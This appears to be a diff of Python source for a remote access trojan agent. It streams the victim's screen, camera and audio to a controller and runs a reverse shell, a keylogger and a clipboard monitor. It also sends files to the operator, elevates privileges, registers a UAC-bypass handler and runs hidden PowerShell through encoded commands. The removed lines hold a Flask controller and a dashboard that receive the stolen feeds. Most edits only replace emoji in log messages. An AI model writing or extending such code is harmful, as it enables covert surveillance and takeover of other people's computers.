+            # and pipe to Out-String to capture everything as text.
+            # Add newline before closing brace to prevent comments from commenting it out.
+            wrapped_command = f"$ProgressPreference = 'SilentlyContinue'; & {{ {command}\n }} *>&1 | Out-String -Width 4096"
+            encoded_command = base64.b64encode(wrapped_command.encode('utf-16le')).decode('utf-8')
             
             result = subprocess.run(
-                [ps_exe_path, "-NoProfile", "-NonInteractive", "-Command", formatted_command],
+                [ps_exe_path, "-NoProfile", "-NonInteractive", "-EncodedCommand", encoded_command],
                 capture_output=True,
                 text=False,
                 timeout=timeout,
@@ -7028,14 +8938,14 @@ def connection_health_monitor():
             if is_connected != CONNECTION_STATE['connected']:
                 if is_connected:
                     # Just connected/reconnected
-                    log_message("[HEALTH_MONITOR] ✅ Connection ACTIVE")
+                    log_message("[HEALTH_MONITOR] [ OK ] Connection ACTIVE")
                     CONNECTION_STATE['connected'] = True
                     CONNECTION_STATE['consecutive_failures'] = 0
                     CONNECTION_STATE['reconnect_needed'] = False
                     CONNECTION_STATE['force_reconnect'] = False
                 else:
                     # Just disconnected
-                    log_message("[HEALTH_MONITOR] ❌ Connection LOST - initiating cleanup...")
+                    log_message("[HEALTH_MONITOR] [ X ] Connection LOST - initiating cleanup...")
                     CONNECTION_STATE['connected'] = False
                     CONNECTION_STATE['consecutive_failures'] += 1
                     
@@ -7051,7 +8961,7 @@ def connection_health_monitor():
             
             # If not connected for more than 5 seconds, force disconnect and reconnect
             if not is_connected and CONNECTION_STATE['consecutive_failures'] > 5:
-                log_message("[HEALTH_MONITOR] ⚠️ Connection dead for 5+ seconds - forcing reconnect")
+                log_message("[HEALTH_MONITOR] [ ! ] Connection dead for 5+ seconds - forcing reconnect")
                 CONNECTION_STATE['force_reconnect'] = True
                 try:
                     if sio is not None and hasattr(sio, 'disconnect'):
@@ -7757,7 +9667,7 @@ def start_streaming(agent_id):
     global STREAMING_ENABLED, STREAM_THREAD
     
     try:
-        with _stream_lock:  # ✅ THREAD-SAFE: Prevent race condition
+        with _stream_lock:  # [ OK ] THREAD-SAFE: Prevent race condition
             if not (SOCKETIO_AVAILABLE and sio is not None and getattr(sio, 'connected', False)):
                 log_message("Cannot start screen streaming: Socket.IO is not connected", "warning")
                 emit_system_notification('warning', 'Screen Stream', 'Cannot start: not connected to controller')
@@ -7780,7 +9690,7 @@ def start_streaming(agent_id):
             emit_system_notification('success', 'Screen Stream Started', 'Screen streaming started successfully')
             
             if AUTO_START_AUDIO_WITH_SCREEN:
-                log_message("🎤 Auto-starting audio streaming with screen stream...")
+                log_message("[AUDIO] Auto-starting audio streaming with screen stream...")
                 start_audio_streaming(agent_id)
             
     except Exception as e:
@@ -7792,7 +9702,7 @@ def stop_streaming():
     global STREAMING_ENABLED, STREAM_THREAD, STREAM_THREADS, capture_queue, encode_queue
     
     try:
-        with _stream_lock:  # ✅ THREAD-SAFE
+        with _stream_lock:  # [ OK ] THREAD-SAFE
             if not STREAMING_ENABLED:
                 emit_system_notification('info', 'Screen Stream', 'Screen streaming is not active')
                 return
@@ -7834,7 +9744,7 @@ def stop_streaming():
             emit_system_notification('success', 'Screen Stream Stopped', 'Screen streaming stopped successfully')
             
             if AUTO_START_AUDIO_WITH_SCREEN:
-                log_message("🎤 Auto-stopping audio streaming with screen stream...")
+                log_message("[AUDIO] Auto-stopping audio streaming with screen stream...")
                 stop_audio_streaming()
             
     except Exception as e:
@@ -7849,7 +9759,7 @@ def start_audio_streaming(agent_id):
     import threading
     
     try:
-        with _audio_stream_lock:  # ✅ THREAD-SAFE: Prevent race condition
+        with _audio_stream_lock:  # [ OK ] THREAD-SAFE: Prevent race condition
             if not (SOCKETIO_AVAILABLE and sio is not None and getattr(sio, 'connected', False)):
                 log_message("Cannot start audio streaming: Socket.IO is not connected", "warning")
                 emit_system_notification('warning', 'Audio Stream', 'Cannot start: not connected to controller')
@@ -7901,7 +9811,7 @@ def stop_audio_streaming():
     global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREADS, audio_capture_queue, audio_encode_queue
     
     try:
-        with _audio_stream_lock:  # ✅ THREAD-SAFE
+        with _audio_stream_lock:  # [ OK ] THREAD-SAFE
             if not AUDIO_STREAMING_ENABLED:
                 emit_system_notification('info', 'Audio Stream', 'Audio streaming is not active')
                 return
@@ -7947,7 +9857,7 @@ def start_camera_streaming(agent_id):
     global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREADS
     
     try:
-        with _camera_stream_lock:  # ✅ THREAD-SAFE: Prevent race condition
+        with _camera_stream_lock:  # [ OK ] THREAD-SAFE: Prevent race condition
             if not (SOCKETIO_AVAILABLE and sio is not None and getattr(sio, 'connected', False)):
                 log_message("Cannot start camera streaming: Socket.IO is not connected", "warning")
                 emit_system_notification('warning', 'Camera Stream', 'Cannot start: not connected to controller')
@@ -7972,7 +9882,7 @@ def start_camera_streaming(agent_id):
                     emit_system_notification('success', 'Camera Stream Started', 'WebRTC camera streaming started successfully with sub-second latency')
                     
                     if AUTO_START_AUDIO_WITH_CAMERA:
-                        log_message("🎤 Auto-starting audio streaming with camera stream...")
+                        log_message("[AUDIO] Auto-starting audio streaming with camera stream...")
                         start_audio_streaming(agent_id)
                     return
                 except Exception as e:
@@ -7985,7 +9895,7 @@ def start_camera_streaming(agent_id):
             emit_system_notification('success', 'Camera Stream Started', 'Socket.IO camera streaming started successfully')
             
             if AUTO_START_AUDIO_WITH_CAMERA:
-                log_message("🎤 Auto-starting audio streaming with camera stream...")
+                log_message("[AUDIO] Auto-starting audio streaming with camera stream...")
                 start_audio_streaming(agent_id)
             
     except Exception as e:
@@ -7998,7 +9908,7 @@ def stop_camera_streaming():
     global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREADS, camera_capture_queue, camera_encode_queue
     
     try:
-        with _camera_stream_lock:  # ✅ THREAD-SAFE
+        with _camera_stream_lock:  # [ OK ] THREAD-SAFE
             if not CAMERA_STREAMING_ENABLED:
                 emit_system_notification('info', 'Camera Stream', 'Camera streaming is not active')
                 return
@@ -8039,7 +9949,7 @@ def stop_camera_streaming():
             emit_system_notification('success', 'Camera Stream Stopped', 'Camera streaming stopped successfully')
             
             if AUTO_START_AUDIO_WITH_CAMERA:
-                log_message("🎤 Auto-stopping audio streaming with camera stream...")
+                log_message("[AUDIO] Auto-stopping audio streaming with camera stream...")
                 stop_audio_streaming()
             
     except Exception as e:
@@ -8249,7 +10159,7 @@ def start_webrtc_streaming(agent_id, enable_screen=True, enable_audio=True, enab
                 if offer:
                     # Send offer to controller via Socket.IO
                     if SOCKETIO_AVAILABLE:
-                        safe_emit('webrtc_offer', {  # ✅ SAFE
+                        safe_emit('webrtc_offer', {  # [ OK ] SAFE
                             'agent_id': agent_id,
                             'offer_sdp': offer.sdp,
                             'enable_screen': enable_screen,
@@ -8426,7 +10336,7 @@ def adaptive_bitrate_control(agent_id, current_quality='auto'):
             
             # Emit quality change event to controller
             if SOCKETIO_AVAILABLE:
-                safe_emit('webrtc_quality_change', {  # ✅ SAFE
+                safe_emit('webrtc_quality_change', {  # [ OK ] SAFE
                     'agent_id': agent_id,
                     'old_quality': current_quality,
                     'new_quality': target_quality,
@@ -8469,7 +10379,7 @@ def implement_frame_dropping(agent_id, load_threshold=0.8):
                 
                 # Emit frame dropping event to controller
                 if SOCKETIO_AVAILABLE:
-                    safe_emit('webrtc_frame_dropping', {  # ✅ SAFE
+                    safe_emit('webrtc_frame_dropping', {  # [ OK ] SAFE
                         'agent_id': agent_id,
                         'system_load': system_load,
                         'load_threshold': load_threshold,
@@ -9240,7 +11150,7 @@ def start_reverse_shell(agent_id):
     """Start the reverse shell connection."""
     global REVERSE_SHELL_ENABLED, REVERSE_SHELL_THREAD
     
-    with _reverse_shell_lock:  # ✅ THREAD-SAFE: Prevent race condition
+    with _reverse_shell_lock:  # [ OK ] THREAD-SAFE: Prevent race condition
         if REVERSE_SHELL_ENABLED:
             log_message("Reverse shell already running", "warning")
             return
@@ -9255,7 +11165,7 @@ def stop_reverse_shell():
     """Stop the reverse shell connection."""
     global REVERSE_SHELL_ENABLED, REVERSE_SHELL_THREAD, REVERSE_SHELL_SOCKET
     
-    with _reverse_shell_lock:  # ✅ THREAD-SAFE
+    with _reverse_shell_lock:  # [ OK ] THREAD-SAFE
         if not REVERSE_SHELL_ENABLED:
             return
         
@@ -9359,7 +11269,7 @@ def start_voice_control(agent_id):
     """Start voice control functionality."""
     global VOICE_CONTROL_ENABLED, VOICE_CONTROL_THREAD
     
-    with _voice_control_lock:  # ✅ THREAD-SAFE: Prevent race condition
+    with _voice_control_lock:  # [ OK ] THREAD-SAFE: Prevent race condition
         if VOICE_CONTROL_ENABLED:
             log_message("Voice control already running", "warning")
             return
@@ -9374,7 +11284,7 @@ def stop_voice_control():
     """Stop voice control functionality."""
     global VOICE_CONTROL_ENABLED, VOICE_CONTROL_THREAD
     
-    with _voice_control_lock:  # ✅ THREAD-SAFE
+    with _voice_control_lock:  # [ OK ] THREAD-SAFE
         if not VOICE_CONTROL_ENABLED:
             return
         
@@ -9696,7 +11606,7 @@ def start_keylogger(agent_id):
         log_message("Error: pynput not available for keylogger", "error")
         return False
     
-    with _keylogger_lock:  # ✅ THREAD-SAFE: Prevent race condition
+    with _keylogger_lock:  # [ OK ] THREAD-SAFE: Prevent race condition
         if KEYLOGGER_ENABLED:
             log_message("Keylogger already running", "warning")
             return True
@@ -9728,7 +11638,7 @@ def stop_keylogger():
     """Stop the keylogger."""
     global KEYLOGGER_ENABLED, KEYLOGGER_THREAD
     
-    with _keylogger_lock:  # ✅ THREAD-SAFE
+    with _keylogger_lock:  # [ OK ] THREAD-SAFE
         if not KEYLOGGER_ENABLED:
             return
         
@@ -9772,7 +11682,7 @@ def clipboard_monitor_worker(agent_id):
                     # Use socket.io for better performance and consistency
                     try:
                         if sio and sio.connected:
-                            safe_emit('clipboard_data', {  # ✅ SAFE
+                            safe_emit('clipboard_data', {  # [ OK ] SAFE
                                 'agent_id': agent_id,
                                 'data': clipboard_entry
                             })
@@ -9811,7 +11721,7 @@ def start_clipboard_monitor(agent_id):
     """Start clipboard monitoring."""
     global CLIPBOARD_MONITOR_ENABLED, CLIPBOARD_MONITOR_THREAD
     
-    with _clipboard_lock:  # ✅ THREAD-SAFE: Prevent race condition
+    with _clipboard_lock:  # [ OK ] THREAD-SAFE: Prevent race condition
         if CLIPBOARD_MONITOR_ENABLED:
             log_message("Clipboard monitor already running", "warning")
             return
@@ -9826,7 +11736,7 @@ def stop_clipboard_monitor():
     """Stop clipboard monitoring."""
     global CLIPBOARD_MONITOR_ENABLED, CLIPBOARD_MONITOR_THREAD
     
-    with _clipboard_lock:  # ✅ THREAD-SAFE
+    with _clipboard_lock:  # [ OK ] THREAD-SAFE
         if not CLIPBOARD_MONITOR_ENABLED:
             return
         
@@ -9854,7 +11764,7 @@ def send_file_chunked_to_controller(file_path, agent_id, destination_path=None):
                 break
             chunk_b64 = 'data:application/octet-stream;base64,' + base64.b64encode(chunk).decode('utf-8')
             
-            # ✅ SAFE EMIT: Check connection before sending
+            # [ OK ] SAFE EMIT: Check connection before sending
             if not safe_emit('file_chunk_from_agent', {
                 'agent_id': agent_id,
                 'filename': filename,
@@ -9929,7 +11839,7 @@ def register_socketio_handlers():
                 'webrtc': AIORTC_AVAILABLE
             },
             'timestamp': int(time.time() * 1000)
-        })  # ✅ SAFE
+        })  # [ OK ] SAFE
             
             try:
                 if CONNECTION_STATE.get('reconnect_needed') or not (globals().get('HEARTBEAT_THREAD') and HEARTBEAT_THREAD.is_alive()):
@@ -10039,6 +11949,14 @@ def register_socketio_handlers():
     # Apply configuration pushed from controller
     # agent_config handling removed in this revision
     sio.on('webrtc_adaptive_bitrate_control')(on_webrtc_adaptive_bitrate_control)
+    
+    # Register automated updater handlers
+    if UPDATER_AVAILABLE:
+        try:
+            register_update_handlers(sio, agent_id)
+            log_message("[ OK ] Automated updater handlers registered successfully")
+        except Exception as e:
+            log_message(f"[ ! ] Failed to register updater handlers: {e}", "warning")
     sio.on('webrtc_implement_frame_dropping')(on_webrtc_implement_frame_dropping)
     sio.on('troll_show_video')(on_troll_show_video_ps)
     sio.on('troll_show_image')(on_troll_show_image_ps)
@@ -10049,6 +11967,7 @@ def register_socketio_handlers():
     sio.on('set_audio_volumes')(on_set_audio_volumes)
     sio.on('toggle_noise_reduction')(on_toggle_noise_reduction)
     sio.on('toggle_echo_cancellation')(on_toggle_echo_cancellation)
+    sio.on('uac_bypass_test')(on_uac_bypass_test)
     
     log_message("Socket.IO event handlers registered successfully", "info")
 
@@ -10165,7 +12084,7 @@ def on_file_chunk_from_operator(data):
             progress = int((received_size / total_size) * 100)
             log_message(f"File {filename}: received {received_size}/{total_size} bytes ({progress}%)")
             
-            # ✅ SEND PROGRESS UPDATE TO UI!
+            # [ OK ] SEND PROGRESS UPDATE TO UI!
             safe_emit('file_upload_progress', {
                 'agent_id': get_or_create_agent_id(),
                 'filename': filename,
@@ -10178,7 +12097,7 @@ def on_file_chunk_from_operator(data):
             # Even if total_size is 0, send progress based on received bytes
             log_message(f"File {filename}: received {received_size} bytes (waiting for total_size or completion event)")
             
-            # ✅ SEND PROGRESS UPDATE (unknown total)
+            # [ OK ] SEND PROGRESS UPDATE (unknown total)
             safe_emit('file_upload_progress', {
                 'agent_id': get_or_create_agent_id(),
                 'filename': filename,
@@ -10194,7 +12113,7 @@ def on_file_chunk_from_operator(data):
             log_message(f"File complete: received {received_size}/{total_size} bytes")
             _save_completed_file(final_path, buffers[final_path])
             
-            # ✅ SEND COMPLETION EVENT TO UI!
+            # [ OK ] SEND COMPLETION EVENT TO UI!
             safe_emit('file_upload_complete', {
                 'agent_id': get_or_create_agent_id(),
                 'filename': filename,
@@ -10255,7 +12174,7 @@ def on_file_upload_complete_from_operator(data):
             buffer_data = on_file_chunk_from_operator.buffers[destination_resolved]
             _save_completed_file(destination_resolved, buffer_data)
             
-            # ✅ SEND FINAL UPLOAD COMPLETION WITH 100% PROGRESS!
+            # [ OK ] SEND FINAL UPLOAD COMPLETION WITH 100% PROGRESS!
             file_size = sum(len(c[1]) for c in buffer_data['chunks'])
             safe_emit('file_upload_progress', {
                 'agent_id': get_or_create_agent_id(),
@@ -10263,7 +12182,7 @@ def on_file_upload_complete_from_operator(data):
                 'destination_path': destination_resolved,
                 'received': file_size,
                 'total': file_size,
-                'progress': 100  # ✅ 100% complete!
+                'progress': 100  # [ OK ] 100% complete!
             })
             safe_emit('file_upload_complete', {
                 'agent_id': get_or_create_agent_id(),
@@ -10322,11 +12241,11 @@ def on_request_file_chunk_from_agent(data):
         for path in possible_paths:
             if os.path.exists(path):
                 file_path = path
-                log_message(f"✅ Found file at: {file_path}")
+                log_message(f"[ OK ] Found file at: {file_path}")
                 break
         
         if not file_path:
-            log_message(f"❌ File not found: {filename}", "error")
+            log_message(f"[ X ] File not found: {filename}", "error")
             log_message("Searched in:")
             for path in possible_paths:
                 log_message(f"  - {path}")
@@ -10371,11 +12290,11 @@ def on_request_file_chunk_from_agent(data):
                 offset += len(chunk)
                 chunk_count += 1
                 
-                # ✅ Calculate and send download progress
+                # [ OK ] Calculate and send download progress
                 progress = int((offset / total_size) * 100)
                 log_message(f"Sent chunk {chunk_count}: {len(chunk)} bytes at offset {offset} ({progress}%)")
                 
-                # ✅ SEND DOWNLOAD PROGRESS UPDATE TO UI!
+                # [ OK ] SEND DOWNLOAD PROGRESS UPDATE TO UI!
                 safe_emit('file_download_progress', {
                     'agent_id': agent_id,
                     'filename': filename_only,
@@ -10388,7 +12307,7 @@ def on_request_file_chunk_from_agent(data):
         log_message(f"File {file_path} sent to controller in {chunk_count} chunks")
         emit_system_notification('success', 'File Download Complete', f'File {filename_only} sent successfully ({total_size} bytes)')
         
-        # ✅ SEND DOWNLOAD COMPLETION EVENT TO UI!
+        # [ OK ] SEND DOWNLOAD COMPLETION EVENT TO UI!
         safe_emit('file_download_complete', {
             'agent_id': agent_id,
             'filename': filename_only,
@@ -10916,7 +12835,7 @@ def execute_command_legacy(command):
         # If command is just the tool name (no arguments), provide help
         cmd_lower = command.strip().lower()
         if cmd_lower in interactive_commands:
-            help_msg = f"ℹ️ '{command}' requires arguments.\n\nSuggested commands:\n{interactive_commands[cmd_lower]}\n\nTip: Type the full command on one line (e.g., 'netsh wlan show profile')"
+            help_msg = f"[i] '{command}' requires arguments.\n\nSuggested commands:\n{interactive_commands[cmd_lower]}\n\nTip: Type the full command on one line (e.g., 'netsh wlan show profile')"
             log_message(f"[PS] Interactive command detected: {command}", "info")
             return help_msg
         
@@ -10959,7 +12878,7 @@ def execute_command_legacy(command):
                     command = f"{translated} {' '.join(cmd_parts[1:])}"
                 else:
                     command = translated
-                log_message(f"[PS] Auto-translated: '{original_command}' → '{command}'", "info")
+                log_message(f"[PS] Auto-translated: '{original_command}' -> '{command}'", "info")
             
             # PowerShell cmdlet detection
             powershell_keywords = [
@@ -11073,15 +12992,15 @@ def execute_command_legacy(command):
         return output
         
     except subprocess.TimeoutExpired:
-        error_msg = "⏱️ Command execution timed out after 30 seconds"
+        error_msg = "[TIME] Command execution timed out after 30 seconds"
         log_message(error_msg, "error")
         return error_msg
     except FileNotFoundError as e:
-        error_msg = f"❌ Executable not found: {e}"
+        error_msg = f"[ X ] Executable not found: {e}"
         log_message(error_msg, "error")
         return error_msg
     except Exception as e:
-        error_msg = f"❌ Command execution failed: {e}"
+        error_msg = f"[ X ] Command execution failed: {e}"
         log_message(error_msg, "error")
         return error_msg
 def main_loop(agent_id):
@@ -12444,21 +14363,21 @@ def test_process_termination_functionality():
     # Check current privileges
     if WINDOWS_AVAILABLE:
         if is_admin():
-            log_message("✓ Running with administrator privileges")
+            log_message("[OK] Running with administrator privileges")
         else:
-            log_message("⚠ Running with user privileges")
+            log_message("[WARN] Running with user privileges")
             log_message("Attempting to elevate privileges...")
             if elevate_privileges():
-                log_message("✓ Privilege escalation successful")
+                log_message("[OK] Privilege escalation successful")
             else:
-                log_message("✗ Privilege escalation failed")
+                log_message("[FAIL] Privilege escalation failed")
                 log_message("Some termination methods may fail")
     else:
-        log_message("✓ Running on Linux/Unix system")
+        log_message("[OK] Running on Linux/Unix system")
         if os.geteuid() == 0:
-            log_message("✓ Running as root")
+            log_message("[OK] Running as root")
         else:
-            log_message("⚠ Running as regular user")
+            log_message("[WARN] Running as regular user")
     
     log_message("\nAvailable commands:")
     log_message("1. kill-taskmgr - Terminate Task Manager")
@@ -12503,1177 +14422,39 @@ def test_process_termination_functionality():
 # ========================================================================================
 
 # ========================================================================================
-# CONTROLLER FUNCTIONALITY
-# Integrated from controller.py
+# AGENT MAIN ENTRY POINT
 # ========================================================================================
 
-try:
-    import eventlet
-    try:
-        import eventlet.hubs
-        eventlet.hubs.use_hub("eventlet.hubs.asyncio")
-    except Exception:
-        pass
-    try:
-        eventlet.monkey_patch()
-    except Exception:
-        pass
-    from flask import Flask, request, jsonify, redirect, url_for, Response, send_file
-    from flask_socketio import SocketIO, emit, join_room, leave_room
-    FLASK_AVAILABLE = True
-    FLASK_SOCKETIO_AVAILABLE = True
-except Exception:
-    FLASK_AVAILABLE = False
-    FLASK_SOCKETIO_AVAILABLE = False
-    log_message("Flask/SocketIO not available. Controller functionality disabled.")
-
-# Controller state
-controller_app = None
-controller_socketio = None
-agents_data = defaultdict(dict)
-connected_agents = set()
-operators = set()
-
-def initialize_controller():
-    """Initialize the Flask-SocketIO controller."""
-    global controller_app, controller_socketio
-    
-    if not FLASK_AVAILABLE:
-        return False
-    
-    controller_app = Flask(__name__)
-    controller_app.config['SECRET_KEY'] = 'neural_control_hub_secret_key'
-    controller_socketio = SocketIO(controller_app, async_mode=('eventlet' if FLASK_SOCKETIO_AVAILABLE else 'threading'))
-    
-    # Setup routes and handlers
-    setup_controller_routes()
-    setup_controller_handlers()
-    
-    return True
-
-def setup_controller_routes():
-    """Setup Flask routes for the controller."""
-    
-    @controller_app.route('/')
-    def index():
-        return "Agent Controller Running"
-    
-    @controller_app.route('/dashboard')
-    def dashboard():
-        return "Dashboard"
-    
-    @controller_app.route('/stream/<agent_id>', methods=['POST'])
-    def stream_in(agent_id):
-        """Receive screen stream data from agent."""
-        try:
-            data = request.get_data()
-            if agent_id not in agents_data:
-                agents_data[agent_id] = {}
-            agents_data[agent_id]['screen_frame'] = data
-            return "OK", 200
-        except Exception as e:
-            return f"Error: {e}", 500
-    
-    @controller_app.route('/video_feed/<agent_id>')
-    def video_feed(agent_id):
-        """Stream video feed to browser."""
-        return Response(generate_video_frames(agent_id),
-                       mimetype='multipart/x-mixed-replace; boundary=frame')
-    
-    @controller_app.route('/camera/<agent_id>', methods=['POST'])
-    def camera_in(agent_id):
-        """Receive camera stream data from agent."""
-        try:
-            data = request.get_data()
-            if agent_id not in agents_data:
-                agents_data[agent_id] = {}
-            agents_data[agent_id]['camera_frame'] = data
-            return "OK", 200
-        except Exception as e:
-            return f"Error: {e}", 500
-    
-    @controller_app.route('/camera_feed/<agent_id>')
-    def camera_feed(agent_id):
-        """Stream camera feed to browser."""
-        return Response(generate_camera_frames(agent_id),
-                       mimetype='multipart/x-mixed-replace; boundary=frame')
-    
-    @controller_app.route('/audio/<agent_id>', methods=['POST'])
-    def audio_in(agent_id):
-        """Receive audio stream data from agent."""
-        try:
-            data = request.get_data()
-            if agent_id not in agents_data:
-                agents_data[agent_id] = {}
-            agents_data[agent_id]['audio_frame'] = data
-            return "OK", 200
-        except Exception as e:
-            return f"Error: {e}", 500
-    
-    @controller_app.route('/audio_feed/<agent_id>')
-    def audio_feed(agent_id):
-        """Stream audio feed to browser."""
-        return Response(generate_audio_stream(agent_id),
-                       mimetype='audio/wav')
-    
-    @controller_app.route('/file_download/<agent_id>', methods=['POST'])
-    def file_download_in(agent_id):
-        """Receive file download data from agent."""
-        try:
-            data = request.get_json()
-            if not data:
-                return "No data received", 400
-            
-            filename = data.get('filename')
-            file_content = data.get('content')
-            file_size = data.get('size')
-            
-            if not all([filename, file_content, file_size]):
-                return "Missing required fields", 400
-            
-            # Store file data for controller to access
-            if agent_id not in agents_data:
-                agents_data[agent_id] = {}
-            agents_data[agent_id]['downloaded_file'] = {
-                'filename': filename,
-                'content': file_content,
-                'size': file_size
-            }
-            
-            # Notify operators about file download
-            if FLASK_SOCKETIO_AVAILABLE:
-                controller_socketio.emit('file_download_complete', {
-                    'agent_id': agent_id,
-                    'filename': filename,
-                    'size': file_size
-                }, room='operators')
-            
-            return "File received successfully", 200
-        except Exception as e:
-            return f"Error: {e}", 500
-    
-    @controller_app.route('/file_upload_result', methods=['POST'])
-    def file_upload_result():
-        """Receive file upload result from agent."""
-        try:
-            data = request.get_json()
-            if not data:
-                return "No data received", 400
-            
-            success = data.get('success', False)
-            result = data.get('result', '')
-            
-            # Notify operators about file upload result
-            if FLASK_SOCKETIO_AVAILABLE:
-                controller_socketio.emit('file_upload_result', {
-                    'success': success,
-                    'result': result
-                }, room='operators')
-            
-            return "Result received", 200
-        except Exception as e:
-            return f"Error: {e}", 500
-
-def generate_video_frames(agent_id):
-    """Generate video frames for streaming."""
-    while True:
-        try:
-            if agent_id in agents_data and 'screen_frame' in agents_data[agent_id]:
-                frame_data = agents_data[agent_id]['screen_frame']
-                yield (b'--frame\r\n'
-                       b'Content-Type: image/jpeg\r\n\r\n' + frame_data + b'\r\n')
-            else:
-                time.sleep(0.5)
-        except Exception as e:
-            break
-
-def generate_camera_frames(agent_id):
-    """Generate camera frames for streaming."""
-    while True:
-        try:
-            if agent_id in agents_data and 'camera_frame' in agents_data[agent_id]:
-                frame_data = agents_data[agent_id]['camera_frame']
-                yield (b'--frame\r\n'
-                       b'Content-Type: image/jpeg\r\n\r\n' + frame_data + b'\r\n')
-            else:
-                time.sleep(0.5)
-        except Exception as e:
-            break
-
-def generate_audio_stream(agent_id):
-    """Generate audio stream."""
-    while True:
-        try:
-            if agent_id in agents_data and 'audio_frame' in agents_data[agent_id]:
-                audio_data = agents_data[agent_id]['audio_frame']
-                yield audio_data
-            else:
-                time.sleep(0.5)
-        except Exception as e:
-            break
-def setup_controller_handlers():
-    """Setup SocketIO event handlers for the controller."""
-    
-    @controller_socketio.on('connect')
-    def controller_handle_connect():
-        log_message(f"Client connected: {request.sid}")
-        join_room('operators')
-        operators.add(request.sid)
-    
-    @controller_socketio.on('disconnect')
-    def controller_handle_disconnect():
-        log_message(f"Client disconnected: {request.sid}")
-        operators.discard(request.sid)
-        try:
-            leave_room('operators')
-        except:
-            pass
-    
-    @controller_socketio.on('operator_connect')
-    def controller_handle_operator_connect():
-        join_room('operators')
-        operators.add(request.sid)
-        # Send current agents list
-        emit('agents_list', {'agents': list(connected_agents)})
-    
-    @controller_socketio.on('agent_connect')
-    def controller_handle_agent_connect(data):
-        agent_id = data.get('agent_id')
-        if agent_id:
-            connected_agents.add(agent_id)
-            agents_data[agent_id]['last_seen'] = time.time()
-            agents_data[agent_id]['sid'] = request.sid
-            
-            # Notify operators
-            controller_socketio.emit('agent_connected', {
-                'agent_id': agent_id,
-                'timestamp': time.time()
-            }, room='operators')
-    
-    @controller_socketio.on('execute_command')
-    def controller_handle_execute_command(data):
-        agent_id = data.get('agent_id')
-        command = data.get('command')
-        
-        if agent_id in agents_data:
-            # Forward command to agent
-            controller_socketio.emit('execute_command', {
-                'agent_id': agent_id,
-                'command': command
-            })
-    
-    @controller_socketio.on('command_result')
-    def controller_handle_command_result(data):
-        agent_id = data.get('agent_id')
-        output = data.get('output')
-        
-        # Forward result to operators
-        controller_socketio.emit('command_result', {
-            'agent_id': agent_id,
-            'output': output,
-            'timestamp': time.time()
-        }, room='operators')
-    
-    @controller_socketio.on('live_key_press')
-    def controller_handle_live_key_press(data):
-        agent_id = data.get('agent_id')
-        key_data = data.get('key_data')
-        
-        # Forward to agent
-        controller_socketio.emit('key_press', key_data)
-    
-    @controller_socketio.on('live_mouse_move')
-    def controller_handle_live_mouse_move(data):
-        agent_id = data.get('agent_id')
-        mouse_data = data.get('mouse_data')
-        
-        # Forward to agent
-        controller_socketio.emit('mouse_move', mouse_data)
-    
-    @controller_socketio.on('live_mouse_click')
-    def controller_handle_live_mouse_click(data):
-        agent_id = data.get('agent_id')
-        mouse_data = data.get('mouse_data')
-        
-        # Forward to agent
-        controller_socketio.emit('mouse_click', mouse_data)
-    
-    @controller_socketio.on('screen_frame')
-    def controller_handle_screen_frame(data):
-        agent_id = data.get('agent_id')
-        frame_data = data.get('frame')
-        
-        if agent_id and frame_data:
-            # Decode base64 frame
-            frame_bytes = base64.b64decode(frame_data)
-            agents_data[agent_id]['screen_frame'] = frame_bytes
-            
-            # Forward to operators
-            controller_socketio.emit('screen_frame', data, room='operators')
-    
-    @controller_socketio.on('camera_frame')
-    def controller_handle_camera_frame(data):
-        agent_id = data.get('agent_id')
-        frame_data = data.get('frame')
-        
-        if agent_id and frame_data:
-            frame_bytes = base64.b64decode(frame_data)
-            agents_data[agent_id]['camera_frame'] = frame_bytes
-            
-            controller_socketio.emit('camera_frame', data, room='operators')
-    
-    @controller_socketio.on('audio_frame')
-    def controller_handle_audio_frame(data):
-        agent_id = data.get('agent_id')
-        audio_data = data.get('audio')
-        
-        if agent_id and audio_data:
-            audio_bytes = base64.b64decode(audio_data)
-            agents_data[agent_id]['audio_frame'] = audio_bytes
-            
-            controller_socketio.emit('audio_frame', data, room='operators')
-
-# Dashboard HTML
-DASHBOARD_HTML = '''
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Neural Control Hub</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.js"></script>
-    <style>
-        :root {
-            --primary-bg: #0a0a0f;
-            --secondary-bg: #1a1a2e;
-            --tertiary-bg: #16213e;
-            --accent-blue: #00d4ff;
-            --accent-purple: #6c5ce7;
-            --accent-green: #00ff88;
-            --accent-red: #ff4757;
-            --text-primary: #ffffff;
-            --text-secondary: #a0a0a0;
-            --border-color: #2d3748;
-            --glass-bg: rgba(255, 255, 255, 0.05);
-            --glass-border: rgba(255, 255, 255, 0.1);
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, var(--primary-bg) 0%, var(--secondary-bg) 100%);
-            color: var(--text-primary);
-            min-height: 100vh;
-            overflow-x: hidden;
-        }
-
-        .header {
-            text-align: center;
-            margin-bottom: 40px;
-            padding: 30px 0;
-        }
-
-        .header h1 {
-            font-family: 'Orbitron', monospace;
-            font-size: 3rem;
-            font-weight: 900;
-            background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            margin-bottom: 10px;
-            text-shadow: 0 0 30px rgba(0, 212, 255, 0.3);
-        }
-
-        .dashboard-grid {
-            display: grid;
-            grid-template-columns: 300px 1fr 350px;
-            gap: 30px;
-            max-width: 1400px;
-            margin: 0 auto;
-            padding: 0 20px;
-            height: calc(100vh - 200px);
-        }
-
-        .panel {
-            background: var(--glass-bg);
-            border: 1px solid var(--glass-border);
-            border-radius: 20px;
-            padding: 25px;
-            backdrop-filter: blur(20px);
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-        }
-
-        .agents-panel h2, .control-panel h2 {
-            color: var(--accent-green);
-            margin-bottom: 20px;
-            font-size: 1.3rem;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .agent-item {
-            background: var(--tertiary-bg);
